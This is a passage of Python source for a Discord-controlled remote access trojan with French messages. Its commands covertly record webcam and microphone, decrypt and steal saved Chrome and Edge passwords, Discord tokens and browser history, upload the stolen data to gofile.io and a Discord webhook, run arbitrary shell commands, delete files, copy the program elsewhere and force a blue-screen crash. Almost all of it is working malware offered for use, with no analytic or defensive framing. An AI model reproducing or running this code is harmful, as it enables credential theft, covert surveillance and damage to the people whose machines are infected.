            description=f"Une erreur est survenue lors de l'exécution du keylogger ou de l'envoi des frappes. Veuillez réessayer plus tard.\n**Conseil :** Vérifiez que le nombre de frappes est un nombre entier.\n\nErreur : `{e}`",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png")
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def shutdown(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()

    try:
        subprocess.run(f'cmd /c "sutdown /s /t 0"', creationflags=subprocess.CREATE_NO_WINDOW)

        succes_turn_off_embed = discord.Embed(
            title=f"L'appareil ` {user} ` à été éteint",
            color=discord.Color.green()
        )
        succes_turn_off_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        succes_turn_off_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=succes_turn_off_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title=f"❌ Erreur lors de l'extinction de l'appareil ` {user} `",
                description=f"une erreur est survenue lors de l'execution du keylogger ou de l'envoi des frappes, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def type(ctx, *, text: str):
    if not isUser(ctx):
        return
    user = os.getlogin()

    try:
        pyautogui.write(text)
        success_type_embed = discord.Embed(
            title=f"Le clavier de l'appareil ` {user} ` a tapé {text}",
            description=f"Le texte ` {text} ` a bien été tapé via le clavier de l'appareil ` {user} `",
            color=discord.Color.green()
        )
        success_type_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        success_type_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=success_type_embed)
        
    except Exception as e:
        error_embed = discord.Embed(
                title=f"❌ Erreur lors de l'écriture de ` {text} ` via le clavier de l'appareil ` {user} `",
                description=f"une erreur est survenue lors de l'execution des frappes, veuillez réessayer plus tard.\n\nErreur : `  {e}  `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def stop(ctx):
    if not isUser(ctx):
        return

    stop_embed = discord.Embed(
        title="Arrêt du BOT...",
        
    )

    await ctx.send(embed=stop_embed)

    sys.exit()

@BOT.hybrid_command()
async def camrecord(ctx, duration: int):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder = f"C:/Users/{user}/UserSystem"
    file_id = ''.join(random.choices("0123456789", k=4))
    filename = f"{rat_folder}/video_{file_id}.mp4" if os.path.exists(rat_folder) else f"./video_{file_id}.mp4"

    recording_embed = discord.Embed(title="📹 Lancement de l'enregistrement de la caméra...")
    recording_embed.set_footer(text=f"Appareil surveillé : {user}")
    await ctx.send(embed=recording_embed)

    try:
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
           await ctx.send("> :x: **Impossible d'activer la caméra**")

        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))  

        start_time = cv2.getTickCount()
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)

            elapsed_time = (cv2.getTickCount() - start_time) / cv2.getTickFrequency()
            if elapsed_time > duration:
                break
        
        cap.release()
        out.release()

        with open(filename, 'rb') as f:
            response = requests.post("https://store1.gofile.io/uploadFile", files={"file": f})
            data = response.json()

        if data["status"] == "ok":
            file_url = data["data"]["downloadPage"]
            upload_message = f"🎬 Enregistrement terminé !\n🔗 **Lien du fichier** : {file_url}"
        else:
            upload_message = "❌ Erreur lors de l'upload sur Gofile."

        result_embed = discord.Embed(title=f"📹 Fin de l'enregistrement de {user}", description=upload_message)
        await ctx.send(embed=result_embed)

        os.remove(filename) 

    except Exception as e:
        error_embed = discord.Embed(
            title=f"❌ Erreur lors de l'enregistrement",
            description=f"Une erreur est survenue : `{e}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def micrecord(ctx, duration: int):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder = f"C:/Users/{user}/UserSystem"
    file_id = ''.join(random.choices("0123456789", k=4))
    filename = f"{rat_folder}/record_{file_id}.wav" if os.path.exists(rat_folder) else f"./record_{file_id}.wav"

    recording_embed = discord.Embed(title="🎤 Lancement de l'écoute...")
    recording_embed.set_footer(text=f"Appareil surveillé : {user}")
    await ctx.send(embed=recording_embed)

    try:
        RATE = 44100  
        CHANNELS = 1 

        audio_data = sd.rec(int(duration * RATE), samplerate=RATE, channels=CHANNELS, dtype='int16')
        sd.wait()

        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(2)
            wf.setframerate(RATE)
            wf.writeframes(audio_data.tobytes())

        with open(filename, 'rb') as f:
            response = requests.post("https://store1.gofile.io/uploadFile", files={"file": f})
            data = response.json()

        if data["status"] == "ok":
            file_url = data["data"]["downloadPage"]
            upload_message = f"🎧 Enregistrement terminé !\n🔗 **Lien du fichier** : {file_url}"
        else:
            upload_message = "❌ Erreur lors de l'upload sur Gofile."

        result_embed = discord.Embed(title=f"🎤 Fin de l'écoute de {user}", description=upload_message)
        await ctx.send(embed=result_embed)

        os.remove(filename)  

    except Exception as e:
        error_embed = discord.Embed(
            title=f"❌ Erreur lors de l'enregistrement",
            description=f"Une erreur est survenue : `{e}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed)


@BOT.hybrid_command()
async def upload(ctx, path=None):
    if not isUser(ctx):
        return
    user = os.getlogin()

    try: 
        with open(path, "rb") as file:
            file_size = os.path.getsize(path)

            if file_size / (1024*1024) > 8:
                too_big_file_embed = discord.Embed(
                    title="Upload sur GoFile.io ...",
                    description=f"Etant donné que la taille du fichier que vous souhaitez récupérer est supérieure ou égale à 8 Mo nous l'uploadons sur GoFile.io. \n\n__**Veuillez patienter**__\n\n**Taille du fichier : {file_size / (1024 * 1024)} Mo",
                    
                )
                await ctx.send(embed=too_big_file_embed)

                try:
                    file_path = f"C:/Users/{user}/collected_datas.zip"
                    gofile_url = "https://store1.gofile.io/uploadFile"
                    files = {'file': open(file_path, 'rb')}
                    try:
                        response = requests.post(gofile_url, files=files)
                    except Exception as e:
                        await ctx.send(f"> :x: **Une erreur est survenue lors de l'upload sur GoFile :** {e}")
                        return
                    
                    if response.status_code == 200:
                        json_data = response.json()
                        if json_data['status'] == 'ok':
                            file_link = json_data["data"]["downloadPage"]
                            await ctx.send(embed=discord.Embed(title=":file_folder: Données uploadées sur GoFile.io", description=f"**URL :** {file_link}"))
                        else:
                            await ctx.send("> :x: **Une erreur inconnue est survenue lors de l'upload des données sur GoFile.io**")

                except Exception as e:
                    error_embed = discord.Embed(
                        title=f"❌ Erreur lors de l'upload du fichier sur file.io ` {path} `",
                        description=f"Une erreur est survenue lors de l'upload'.\n**Conseil :** Vérifiez que l'adresse fournie est bien valide et que la victime à une connexion inernet activée.\n\nErreur : `  {e}  `",
                        color=discord.Color.red()
                    )

                    error_embed.set_thumbnail(
                        url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
                    )

                    error_embed.set_footer(text=f"Appareil surveillé : {user}")

                    await ctx.send(embed=error_embed)
                    return
                data = response.json()
                upload_success_embed = discord.Embed(
                    title="Fichier uploadé !",
                    description=f"**[Clique ici]({data.get('link', 'Unavailable link')})** pour télécharger le fichier.",
                    
                )
                await ctx.send(embed=upload_success_embed)
                return 
            
            stolen_file = discord.File(file, filename=path.split("\\")[-1])
            upload_success_embed = discord.Embed(
                title=f"Le fichier situé à l'adresse ` {path} ` à été récupéré",
                
            )
            upload_success_embed.set_thumbnail(
            url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
        )
            upload_success_embed.set_footer(text=f"Appareil surveillé : {user}")

            await ctx.send(embed=upload_success_embed, file=stolen_file)

    except Exception as e:
            error_embed = discord.Embed(
                title=f"❌ Erreur lors de la récuperation du fichier situé à l'adresse ` {path} `",
                description=f"Une erreur est survenue lors de la récupération.\n**Conseil :** Vérifiez que l'adresse fournie est bien valide\n\nErreur : `  {e}  `",
                color=discord.Color.red()
            )
            error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
            error_embed.set_footer(text=f"Appareil surveillé : {user}")

            await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def delete(ctx, *, path):
    if not isUser(ctx):
        return
    user = os.getlogin()
    try:
        if os.path.isfile(path):
            os.chmod(path, stat.S_IWRITE)
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path)

        delete_success_embed = discord.Embed(
            title=f"Supression du pc ` {user} ` effectuée",
            description=f"La supression de l'élément situé à l'adresse {path} a bien été effectuée",
            color=discord.Color.green()
        )
        delete_success_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        delete_success_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=delete_success_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title=f"❌ Erreur lors de la supression de l'élément situé à l'adresse ` {path} `",
                description=f"Une erreur est survenue lors de la supression.\n**Conseil :** Vérifiez que l'adresse fournie est bien valide\n\nErreur : `  {e}  `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def duplicate(ctx, *, duplicate_path=None):
    if not isUser(ctx):
        return
    user = os.getlogin()
    if duplicate_path is None:
        await ctx.send("Veuillez fournir un chemin pour la duplication.")
        return

    try:
        if hasattr(sys, 'frozen'):
            script_path = sys.executable 
        else:
            script_path = __file__ 

        shutil.copy(script_path, duplicate_path) 

        success_duplication_embed = discord.Embed(
            title=f"Le fichier a bien été dupliqué vers le chemin `{duplicate_path}`",
            description=f"La duplication vers le chemin `{duplicate_path}` a réussi.\n\n"
                        f"**Chemin du fichier origine :** {script_path}\n**Chemin du fichier dupliqué :** {duplicate_path}",
            color=discord.Color.green()
        )
        success_duplication_embed.set_thumbnail(
            url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
        )
        success_duplication_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=success_duplication_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title=f"❌ Erreur lors de la duplication du fichier vers le chemin `{duplicate_path}`",
            description=f"Une erreur est survenue lors de la duplication.\n**Conseil :** Vérifiez que l'adresse fournie est bien valide\n\nErreur : ` {e} `",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(
            url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
        )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def bsod(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()

    try:
        nullptr = ctypes.POINTER(ctypes.c_int)()

        ctypes.windll.ntdll.RtlAdjustPrivilege(
            ctypes.c_uint(19),
            ctypes.c_uint(1),
            ctypes.c_uint(0),
            ctypes.byref(ctypes.c_int())
        )

        ctypes.windll.ntdll.NtRaiseHardError(
            ctypes.c_ulong(0xC000007B),
            ctypes.c_ulong(0),
            nullptr,
            nullptr,
            ctypes.c_uint(6),
            ctypes.byref(ctypes.c_uint())
        )

        success_bsod_embed = discord.Embed(
            title=f"BSOD généré sur l'appareil ` {user} `",
            description=f"Processus critique : ` svchost.exe `",
            color=discord.Color.green()
        )
        success_bsod_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        success_bsod_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=success_bsod_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title=f"❌ Erreur lors de la génération du BSOD sur l'appareil ` {user} `",
                description=f"Une erreur est survenue lors de la génération du BSOD\n\nErreur : `  {e}  `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()  
async def recovery(ctx, url=None):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder = f"C:/Users/{user}/UserSystem"
    local_state_path_edge = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Local State"
    local_state_path_chrome = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State"
    passwords_count_edge = 0
    passwords_count_chrome = 0

    if url is None:
        await ctx.send(f"> :x: **Mauvaise syntaxe de commande :** Veuillez respecter la syntaxe suivante : `{BOT.command_prefix}recovery <url du webhook>`\n\n**Exemple :** {BOT.command_prefix}recovery https://discord.com/api/webhooks/132888887494/gtzhyko622e6r8ft")
        return

    try:
        rsp = requests.get(url)
        if not rsp.status_code == 200:
            await ctx.send(f"> :x: **URL invalide :** {rsp.status_code}")
            return
    except Exception as e:
        await ctx.send("> :x: **Impossible d'accéder à l'url :** Vérifiez sa validité.")
        return

    try:
        os.makedirs(f"{rat_folder}/Steal_{user}/Browsers", exist_ok=True)
        os.makedirs(f"{rat_folder}/Steal_{user}/Browsers/Passwords", exist_ok=True)
        os.makedirs(f"{rat_folder}/Steal_{user}/Browsers/History", exist_ok=True)
        os.makedirs(f"{rat_folder}/Steal_{user}/Discord", exist_ok=True)
        os.makedirs(f"{rat_folder}/Steal_{user}/System", exist_ok=True)
    except Exception:
        pass

    def get_master_key(local_state_path):
        try:
            with open(local_state_path, "r", encoding="utf-8") as file:
                local_state = json.load(file)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            pass
        return None

    def recover_passwords(login_data_path, master_key, pass_file_path):
        nonlocal passwords_count_edge, passwords_count_chrome
        try:
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()
            query = "SELECT origin_url, username_value, password_value FROM logins"
            cursor.execute(query)

            with open(pass_file_path, "w", encoding='utf-8') as pass_file:
                pass_file.write("""\n<===================================[PASSWORDS]===================================>\n""")
                for row in cursor.fetchall():
                    if row[2] is not None:
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2] 

                        iv = encrypted_password[3:15]
                        payload = encrypted_password[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                        
                        pass_file.write(f"""
___________________________________________________________________________________________
URL : {origin_url}
USERNAME/MAIL : {username}
PASSWORD : {decrypted_pass}
""")
                        if "Edge" in pass_file_path:
                            passwords_count_edge += 1
                        else:
                            passwords_count_chrome += 1

            conn.close()
        except Exception:
            pass

    def recover_history(history_path, history_file_path, browser_name):
        try:
            conn = sqlite3.connect(f'file:{history_path}?mode=ro', uri=True)
            cursor = conn.cursor()

            query = "SELECT url, title, visit_count, last_visit_time FROM urls"
            cursor.execute(query)

            with open(history_file_path, "w", encoding='utf-8') as history_file:
                history_file.write(f"\n<====================================[HISTORIQUE : {browser_name}]====================================>\n")
                for row in cursor.fetchall():
                    url, title, visits_count, last_visit_time = row
                    history_file.write(f"""               
____________________________________________________________________________
TITRE : {title}
URL : {url} 
NOMBRE DE VISITES : {visits_count} 
                    """)
            conn.close()
        except Exception:
            pass

    if os.path.exists(local_state_path_edge):
        master_key = get_master_key(local_state_path_edge)
        if master_key:
            login_data_path_edge = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
            subprocess.run('cmd /c "TASKKILL /F /IM msedge.exe"', creationflags=subprocess.CREATE_NO_WINDOW)
            if os.path.exists(login_data_path_edge):
                recover_passwords(login_data_path_edge, master_key, f"{rat_folder}/Steal_{user}/Browsers/Passwords/passedge.txt")
    
    if os.path.exists(local_state_path_chrome):
        master_key = get_master_key(local_state_path_chrome)
        if master_key:
            login_data_path_chrome = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
            subprocess.run('cmd /c "TASKKILL /F /IM chrome.exe"', creationflags=subprocess.CREATE_NO_WINDOW)
            if os.path.exists(login_data_path_chrome):
                recover_passwords(login_data_path_chrome, master_key, f"{rat_folder}/Steal_{user}/Browsers/Passwords/passchrome.txt")

    chrome_history_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\History"
    if os.path.exists(chrome_history_path):
        subprocess.run('cmd /c "TASKKILL /F /IM chrome.exe"', creationflags=subprocess.CREATE_NO_WINDOW)
        recover_history(chrome_history_path, f"{rat_folder}/Steal_{user}/Browsers/History/Chrome.txt", "Chrome")

    edge_history_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\History"
    if os.path.exists(edge_history_path):
        subprocess.run('cmd /c "TASKKILL /F /IM msedge.exe"', creationflags=subprocess.CREATE_NO_WINDOW)
        recover_history(edge_history_path, f"{rat_folder}/Steal_{user}/Browsers/History/Edge.txt", "Edge")

    await ctx.send(f"> :white_check_mark: **Récupération terminée :** {passwords_count_edge + passwords_count_chrome} mots de passe récupérés et historiques enregistrés.")

    def extr4ct_t0k3n5():
        appdata_local = os.getenv("localappdata")
        appdata_roaming = os.getenv("appdata")
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        t0k3n5 = []

        paths = {
            'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Google Chrome': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        }

        def decrypt_val(buff, master_key):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()

        def get_master_key(path):
            if not os.path.exists(path):
                return None
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _d15c0rd = name.replace(" ", "").lower()
            if "cord" in path:
                local_state_path = appdata_roaming + f'\\{_d15c0rd}\\Local State'
                if not os.path.exists(local_state_path):
                    continue
                master_key = get_master_key(local_state_path)
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for enc_t0k3n in re.findall(regexp_enc, line.strip()):
                                t0k3n = decrypt_val(base64.b64decode(enc_t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                                t0k3n5.append(t0k3n)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                t0k3n5.append(t0k3n)

        return t0k3n5

    tokens = extr4ct_t0k3n5()

    token_found = 0

    if tokens:
        unique_tokens = set(tokens) 
        with open(f"{rat_folder}/Steal_{user}/Discord/tokens.txt", "w", encoding='utf-8') as file:
            file.write("<=====================[ TOKENS ]=====================>\n\n")
            for token_stolen in unique_tokens:
                header = {
                    "Authorization": token_stolen
                }

                try:
                    rsp = requests.get("https://discord.com/api/v9/users/@me", headers=header)
                    if rsp.status_code == 200:
                        file.write(token_stolen + "\n")
                        token_found += 1
                except:
                    pass
    else:
        with open(f"{rat_folder}/Steal_{user}/Browsers/Discord/NoTokenFound.txt", "w", encoding='utf-8') as file:
            file.write("No Token found\n\n")

    try:
            hostname = socket.gethostname()
    except:
        pass
    try:
        pc_ip = socket.gethostbyname(hostname)
    except:
        pc_ip = "Une erreur est survenue lors de la récupération"
    try:
        pc_name = os.getlogin()
    except:
        pc_name = "Une erreur est survenue lors de la récupération"
    try:
        pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors='ignore').splitlines()[2].strip()
    except:
        pc_gpu = "Une erreur est survenue lors de la récupération"
    try:
        pc_cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]
    except:
        pc_cpu = "Une erreur est survenue lors de la récupération"
    try:
        pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
    except:
        pc_ram = "Une erreur est survenue lors de la récupération"
    try:
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except:
        mac_address = "Une erreur est survenue lors de la récupération"
    try:
        pc_uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8').split('\n')[1].strip()
    except:
        pc_uuid = "Une erreur est survenue lors de la récupération"

    with open(f"{rat_folder}/Steal_{user}/System/system_infos.txt", "w", encoding='utf-8') as file:
        file.write(f"""<=========================[ SYSTEM INFOS ]=========================>

PC NAME : {pc_name}          
GPU : {pc_gpu}
CPU : {pc_cpu}
RAM : {pc_ram} Gb

IP : {pc_ip}
MAC ADRESS : {mac_address}
UUID : {pc_uuid}""")

    try:
        disk_serial = subprocess.check_output('wmic diskdrive get SerialNumber', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8')
    except Exception as e:
        disk_serial = f"None : Error ({str(e)})"

    try:
        motherboard_serial = subprocess.check_output('wmic baseboard get SerialNumber', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8')
    except Exception as e:
        motherboard_serial = f"None : Error ({str(e)})"

    try:
        bios_serial = subprocess.check_output('wmic bios get SerialNumber', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8')
    except Exception as e:
        bios_serial = f"None : Error ({str(e)})"

        with open(f"{rat_folder}/Steal_{user}/System/serial_check.txt", "w", encoding='utf-8')as file:
            file.write(f"""<=========================[ SERIAL CHECK ]=========================>

UUID : {pc_uuid}    
DISK : {disk_serial}
MOTHERBOARD : {motherboard_serial}
BIOS : {bios_serial}

""")

    shutil.make_archive(f"{rat_folder}/Steal_{user}", 'zip', f"{rat_folder}/Steal_{user}")

    file_path = f"C:/Users/{user}/collected_datas.zip"
    gofile_url = "https://store1.gofile.io/uploadFile"
    files = {'file': open(file_path, 'rb')}
    try:
        response = requests.post(gofile_url, files=files)
    except Exception as e:
        await ctx.send(f"> :x: **Une erreur est survenue lors de l'upload sur GoFile :** {e}")
        return
    
    if response.status_code == 200:
        json_data = response.json()
        if json_data['status'] == 'ok':
            file_link = json_data["data"]["downloadPage"]
            webhook_json = {
  "content": f"> **Information de {user} uploadées vers {file_link}**",
  "username": "K4L4SHNIK0V RAT"
}
            try:
                rsp = requests.post(url, json=webhook_json)
            except Exception as e:
                await ctx.send(f"> :x: **Une erreur est survenue lors de l'envoi au webhook :** {e}")
            if rsp.status_code == 200:
                await ctx.send(f"> **Informations sur {user} envoyées vers le webhook**\n**URL :** `{url}`")
            else:
                await ctx.send(f"> **Impossible d'envoyer les informations au webhook : {rsp.status_code}**\n**URL :** `{url}`")
        else:
            await ctx.send(f"> :x: **Impossible d'uploader les données sur GoFile :** {rsp.status_code}")
    else:
        await ctx.send(f"> :x: **Impossible d'uploader les données sur GoFile :** {rsp.status_code}")

        
@BOT.hybrid_command()
async def stealpass(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()
    local_state_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Local State"
    passwords_count_edge = 0
    passwords_count_chrome = 0
    if os.path.exists(local_state_path):
      try:
         with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)

         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
      except Exception:
         pass

      login_data_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
      subprocess.run('cmd /c "TASKKILL /F /IM msedge.exe"', creationflags=subprocess.CREATE_NO_WINDOW)
      if os.path.exists(login_data_path):
         try:
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()

            query = "SELECT origin_url, username_value, password_value FROM logins"
            cursor.execute(query)

            with open(f"passedge.txt", "w", encoding='utf-8') as pass_file:
                pass_file.write("""
                                              ________________
         <===================================[PASSWORDS : Edge]===================================>
         """)
                for row in cursor.fetchall():
                  passwords_count_edge += 1
                  origin_url = row[0]
                  username = row[1]
                  encrypted_password = row[2] 

                  iv = encrypted_password[3:15]
                  payload = encrypted_password[15:]
                  cipher = AES.new(master_key, AES.MODE_GCM, iv)
                  decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                  pass_file.write(f"""
         ___________________________________________________________________________________________
         URL : {origin_url}
         USERNAME/MAIL : {username}
         PASSWORD : {decrypted_pass}""")
                
                pass_file.close()
                file = discord.File("passedge.txt", filename="passedge.txt")

                await ctx.author.send(file=file)

                successuflly_stolen_pass = discord.Embed(
                    title="Pass (edge) volées !",
                    description=f"Nombre de pass trouvé : {passwords_count_edge}\n\nLe fichier texte qui les contient vous a été envoyé en MP.",
                    
                )
                await ctx.send(embed=successuflly_stolen_pass)
                time.sleep(1)
                os.remove("passedge.txt")
         except Exception:
            passwords_count_edge = "An error occured"
            pass
         finally:
            conn.close()

    local_state_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State"

    if os.path.exists(local_state_path):
      try:
         with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)

         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
      except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue pour Edge",
                description=f"Il semblerait qu'une erreur soit survenue.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
        await ctx.send(embed=error_embed)

    login_data_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data"

    if os.path.exists(login_data_path):
        try:
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()
            subprocess.run('cmd /c "TASKKILL /F /IM chrome.exe"', creationflags=subprocess.CREATE_NO_WINDOW)
            query = "SELECT origin_url, username_value, password_value FROM logins"
            cursor.execute(query)

            with open(f"passchrome.txt", "w", encoding='utf-8') as pass_file:

                pass_file.write("""
        <===================================[PASSWORDS : Chrome]===================================>
        """)
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2] 
                    passwords_count_chrome += 1
                    iv = encrypted_password[3:15]
                    payload = encrypted_password[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                    pass_file.write(f"""
            ___________________________________________________________________________________________
            URL : {origin_url}
            USERNAME/MAIL : {username}
            PASSWORD : {decrypted_pass}""")
                
                pass_file.close()
                file = discord.File("passchrome.txt", filename="passchrome.txt")

                await ctx.author.send(file=file)

                successuflly_stolen_pass = discord.Embed(
                    title="Pass (chrome) volées !",
                    description=f"Nombre de pass trouvé : {passwords_count_chrome}\n\nLe fichier texte qui les contient vous a été envoyé en MP.",
                    
                )
                await ctx.send(embed=successuflly_stolen_pass)
                time.sleep(1)
                os.remove("passchrome.txt")
        except Exception as e:
            error_embed = discord.Embed(
                title="Une erreur est survenue pour Chrome",
                description=f"Il semblerait qu'une erreur soit survenue.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=error_embed)
        finally:
            conn.close()

@BOT.hybrid_command()
async def exeout(ctx, *, cmd):
    if not isUser(ctx):
        return
    noconsole = False
    user = os.getlogin()
    rat_folder = f"C:/Users/{user}/UserSystem"

    if cmd.startswith("noconsole"):
        noconsole = True
        cmd = cmd.replace("noconsole ", "")

    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW) if noconsole == True else subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if len(result.stdout) > 4000:
            exeout_embed = discord.Embed(
                title="Commande executée.",
                description=f"La commande {cmd} a été exécutée sur l'ordinateur cible.\n\n**Résultat de la commande :**\nSans console : {"Oui" if noconsole == True else "Non"}\n\nLe contenu a été envoyé sous forme de fichier texté étant donné qu'il comporte trop de caractères.",
                
            )
            await ctx.send(embed=exeout_embed)
        
            with open(f"{rat_folder}/exeout_result.txt" if os.path.exists(rat_folder) else "exeout_result.txt", "w", encoding='utf-8') as file:
                file.write(f"<=======================[COMMAND OUTPUT]=======================>\n\n{result.stdout}")
